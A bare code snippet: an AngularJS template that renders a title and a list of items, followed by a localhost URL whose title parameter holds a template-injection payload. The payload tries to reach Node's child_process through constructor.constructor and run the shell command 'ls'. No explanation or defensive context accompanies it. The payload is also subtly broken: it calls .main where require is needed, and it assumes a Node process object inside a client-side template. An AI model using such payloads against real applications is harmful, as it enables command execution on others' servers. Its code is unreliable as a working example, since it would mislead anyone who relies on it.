source code:

```
<div ng-controller="MyController">
  <h1>{{ title }}</h1>
  <div ng-repeat="item in items">
    <h2>{{ item.title }}</h2>
    <p>{{ item.description }}</p>
  </div>
</div>
```

```http://localhost:3000/?title={{constructor.constructor('return this.process.mainModule.require')().main('child_process').execSync('ls').toString()}}```
